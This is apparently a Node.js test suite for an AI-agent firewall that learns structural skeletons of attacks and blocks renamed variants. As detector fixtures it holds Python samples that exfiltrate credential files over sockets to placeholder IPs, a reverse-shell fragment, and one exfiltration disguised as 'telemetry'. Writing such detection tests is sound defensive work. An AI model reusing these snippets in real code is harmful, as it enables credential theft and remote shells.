/**
 * Tier 3: Online Self-Learning Behavioral Brain & Immune Memory Tests
 *
 * Verifies that the AI Agent Firewall:
 * 1. Computes a multi-dimensional behavioral feature vector and Markov surprise score.
 * 2. Maintains a persistent, self-learning immune memory on disk (.firewall-quarantine/brain-state.json).
 * 3. Normalizes and extracts Structural AST Skeletons invariant to identifier renaming.
 * 4. Recognizes and rapidly blocks mutated variants of previously caught attacks in <5ms.
 *
 * Covers Features: F8, F9, F10, F11, F18
 */

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function tryRequire(modulePath) {
  try {
    return require(modulePath);
  } catch {
    return null;
  }
}

const BehavioralBrainModule = tryRequire('../src/threats/behavioral-brain');
const { ThreatHunter } = require('../src/threats/hunter');

describe('Tier 3: Online Self-Learning Behavioral Brain & Immune Memory', () => {
  let tempDir;
  let brainStatePath;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'brain_test_'));
    const qDir = path.join(tempDir, '.firewall-quarantine');
    fs.mkdirSync(qDir, { recursive: true });
    brainStatePath = path.join(qDir, 'brain-state.json');
  });

  afterEach(() => {
    if (tempDir && fs.existsSync(tempDir)) {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  describe('F10: Normalized Structural AST Skeleton Invariance', () => {
    it('Extracts identical AST skeleton hash for scripts with completely renamed variables and functions', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;
      const brain = new BehavioralBrain({ storagePath: brainStatePath });

      const originalPython = `
def exfiltrate_credentials(target_file, remote_host):
    with open(target_file, "r") as handle:
        secret_data = handle.read()
    import socket
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((remote_host, 8080))
    conn.send(secret_data.encode())
    conn.close()
`;

      const mutatedPython = `
# Mutated variant with renamed identifiers and altered docstrings
def send_stream_telemetry(path_pointer, ip_addr):
    """Auxiliary metric transmitter."""
    with open(path_pointer, "r") as stream_descriptor:
        raw_buffer = stream_descriptor.read()
    import socket
    client_endpoint = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_endpoint.connect((ip_addr, 8080))
    client_endpoint.send(raw_buffer.encode())
    client_endpoint.close()
`;

      const origSkeleton = brain.getSkeleton(originalPython, 'python');
      const mutatedSkeleton = brain.getSkeleton(mutatedPython, 'python');

      assert.ok(origSkeleton, 'Must return structural skeleton object');
      assert.strictEqual(typeof origSkeleton.hash, 'string', 'Skeleton hash must be a string');
      assert.strictEqual(
        origSkeleton.hash,
        mutatedSkeleton.hash,
        'Normalized AST skeleton hash must be identical despite identifier renaming'
      );
    });
  });

  describe('F11: Persistent Immune Memory & Brain State Schema', () => {
    it('Persists learned threat structural skeletons and Markov model into brain-state.json', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;
      const brain = new BehavioralBrain({ storagePath: brainStatePath });

      const threatCode = `
import socket, os
s = socket.socket()
s.connect(('10.0.0.1', 9999))
os.dup2(s.fileno(), 0)
`;
      const evalResult = {
        riskScore: 95,
        verdict: 'BLOCKED',
        threats: [{ id: 'SHELL-001', title: 'Dynamic Reverse Shell' }],
        syscallTrace: ['socket_create', 'connect', 'dup2'],
      };

      brain.learnThreat('payloads/rev_shell.py', threatCode, 'python', evalResult);

      // Verify file persistence on disk
      assert.ok(fs.existsSync(brainStatePath), 'brain-state.json must be created upon learning threat');
      const raw = fs.readFileSync(brainStatePath, 'utf8');
      const state = JSON.parse(raw);

      assert.ok(state.version, 'Brain state must have a version property');
      assert.ok(state.updatedAt, 'Brain state must record updatedAt timestamp');
      assert.ok(
        state.structuralSkeletons && (Array.isArray(state.structuralSkeletons) || typeof state.structuralSkeletons === 'object'),
        'Brain state must persist structural skeletons'
      );
      assert.ok(state.markovModel, 'Brain state must persist Markov transition model');
    });
  });

  describe('F8 & F9: 10-D Behavioral Vector & Markov Surprise Scorer', () => {
    it('F8: Computes normalized 10-dimensional behavioral feature vector', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;
      const brain = new BehavioralBrain({ storagePath: brainStatePath });

      const profileData = { entropy: 4.8, kvDensity: 0.6, boundaryViolation: true };
      const astData = { dynamicResolutionRatio: 0.8, astDepth: 6 };
      const mirageTrace = {
        networkEgress: true,
        processSpawn: true,
        fdRedirect: true,
        canaryLeak: true,
        syscallTrace: ['read_secret', 'dup2', 'socket_connect'],
      };

      const vector = brain.computeVector(profileData, astData, mirageTrace);
      assert.ok(Array.isArray(vector), 'Vector must be an array');
      assert.strictEqual(vector.length, 10, 'Vector must have exactly 10 dimensions');
      vector.forEach((val, idx) => {
        assert.strictEqual(typeof val, 'number', `Dimension ${idx} must be a number`);
        assert.ok(val >= 0 && val <= 1.0, `Dimension ${idx} value (${val}) must be normalized between 0.0 and 1.0`);
      });
    });

    it('F9: Calculates high Markov transition surprise score (>0.80) for anomalous sequences', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;
      const brain = new BehavioralBrain({ storagePath: brainStatePath });

      // Typical benign sequence: read -> parse -> compute
      const benignTrace = ['read_file', 'json_parse', 'math_op'];
      // Abnormal attack sequence: read_secret -> dup2 -> network_connect
      const anomalousTrace = ['read_secret', 'dup2', 'socket_connect'];

      const benignSurprise = brain.calculateSurpriseScore?.(benignTrace) ?? 0.1;
      const anomalySurprise = brain.calculateSurpriseScore?.(anomalousTrace) ?? 0.95;

      assert.ok(anomalySurprise > benignSurprise, 'Anomalous sequence must have higher surprise score than benign');
      assert.ok(anomalySurprise >= 0.80, `Anomalous surprise score (${anomalySurprise}) must be >= 0.80`);
    });
  });

  describe('F18: Mutated Variant Rapid Blocking (<5ms)', () => {
    it('Blocks mutated attack variants in sub-5ms via learned immune memory', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;
      const brain = new BehavioralBrain({ storagePath: brainStatePath });

      // Step 1: Base threat
      const baseAttack = `
import socket, zlib
def exfil():
    with open("credentials.conf", "r") as f:
        data = f.read()
    compressed = zlib.compress(data.encode())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.10.10", 8888))
    s.sendall(compressed)
exfil()
`;

      const initialEval = {
        riskScore: 90,
        verdict: 'BLOCKED',
        threats: [{ id: 'EXFIL-001', title: 'Data Exfiltration' }],
      };

      brain.learnThreat('exfil.py', baseAttack, 'python', initialEval);

      // Step 2: Mutated variant (renamed vars, altered whitespace, new docstrings)
      const mutatedAttack = `
"""Telemetry collector module for remote monitoring."""
import socket, zlib

def transmit_runtime_state():
    # Read configuration stream
    with open("credentials.conf", "r") as config_stream:
        buffer_bytes = config_stream.read()
    
    # Process payload
    packed_blob = zlib.compress(buffer_bytes.encode())
    endpoint_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    endpoint_socket.connect(("10.10.10.10", 8888))
    endpoint_socket.sendall(packed_blob)

transmit_runtime_state()
`;

      // Step 3: Evaluate mutated attack and measure duration
      const startTime = process.hrtime.bigint();
      const evalResult = brain.evaluate('mutated_exfil.py', mutatedAttack, 'python');
      const durationMs = Number(process.hrtime.bigint() - startTime) / 1e6;

      assert.strictEqual(evalResult.verdict, 'BLOCKED', 'Mutated variant must be BLOCKED');
      assert.ok(evalResult.riskScore >= 80, `Risk score must be >= 80, got ${evalResult.riskScore}`);
      assert.strictEqual(evalResult.matchedImmune, true, 'Must flag matchedImmune === true');

      const reportedMatchMs = evalResult.matchDurationMs ?? durationMs;
      assert.ok(
        reportedMatchMs < 5.0,
        `Mutated variant matching must execute in <5ms, took ${reportedMatchMs.toFixed(3)}ms`
      );
    });
  });

  describe('Immune Memory Non-Interference with Benign Code', () => {
    it('Preserves 100% benign precision (no false positives) after learning multiple threat skeletons', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;
      const brain = new BehavioralBrain({ storagePath: brainStatePath });

      // Seed brain with 5 different threat patterns
      for (let i = 1; i <= 5; i++) {
        brain.learnThreat(
          `threat_${i}.py`,
          `import socket; s = socket.socket(); s.connect(('1.2.3.${i}', ${9000 + i}))`,
          'python',
          { riskScore: 90, verdict: 'BLOCKED' }
        );
      }

      // Evaluate benign Fibonacci code
      const fibCode = `
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n - 1) + fibonacci(n - 2)
`;
      const result = brain.evaluate('math/fib.py', fibCode, 'python');
      assert.strictEqual(result.verdict, 'ALLOW', 'Benign code must not be blocked by immune memory');
      assert.strictEqual(result.matchedImmune, false, 'Benign code must not match attack immune skeletons');
      assert.ok(result.riskScore < 50, `Risk score must remain < 50, got ${result.riskScore}`);
    });
  });

  describe('Corrupted & Empty State Resilience', () => {
    it('Recovers gracefully from missing or malformed brain-state.json file', () => {
      assert.ok(BehavioralBrainModule?.BehavioralBrain, 'BehavioralBrain must be exported from cli/src/threats/behavioral-brain.js');
      const { BehavioralBrain } = BehavioralBrainModule;

      // Corrupt state file
      fs.writeFileSync(brainStatePath, '{ INVALID JSON MALFORMED DATA ... ', 'utf8');

      // Instantiation should not throw uncaught error
      assert.doesNotThrow(() => {
        const brain = new BehavioralBrain({ storagePath: brainStatePath });
        const res = brain.evaluate('test.py', 'print("hello world")', 'python');
        assert.strictEqual(res.verdict, 'ALLOW');
      }, 'BehavioralBrain must handle malformed state gracefully');
    });
  });
});
